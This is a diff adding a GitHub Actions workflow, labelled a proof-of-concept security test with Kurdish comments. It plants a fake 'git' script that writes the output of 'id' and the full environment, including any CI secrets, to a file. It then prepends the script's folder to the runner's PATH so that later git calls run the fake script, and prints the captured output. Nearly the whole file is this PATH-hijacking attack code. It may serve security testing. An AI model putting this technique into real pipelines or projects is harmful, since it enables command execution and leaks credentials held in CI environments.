@@ -1,0 +1,29 @@
+name: PoC Security Test
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      # ١. دروستکردنی سکریپتی ساختە
+      - name: Create malicious git
+        run: |
+          mkdir -p bin
+          echo '#!/bin/bash' > bin/git
+          echo 'echo "--- RCE PROOF ---" > /tmp/proof.txt' >> bin/git
+          echo 'id >> /tmp/proof.txt' >> bin/git
+          echo 'env >> /tmp/proof.txt' >> bin/git
+          echo '/usr/bin/git "$@"' >> bin/git
+          chmod +x bin/git
+          
+      # ٢. هاککردنی PATHـی سێرڤەرەکە
+      - name: Inject PATH
+        run: echo "$GITHUB_WORKSPACE/bin" >> $GITHUB_PATH
+        
+      # ٣. جێبەجێکردنی سکریپتی پڕۆژەکە کە git بانگ دەکات
+      - name: Run script
+        run: |
+          # لێرە تاقیی دەکەینەوە ئایا gitـی ساختەی ئێمە بەکاردێت؟
+          git --version
+          cat /tmp/proof.txt
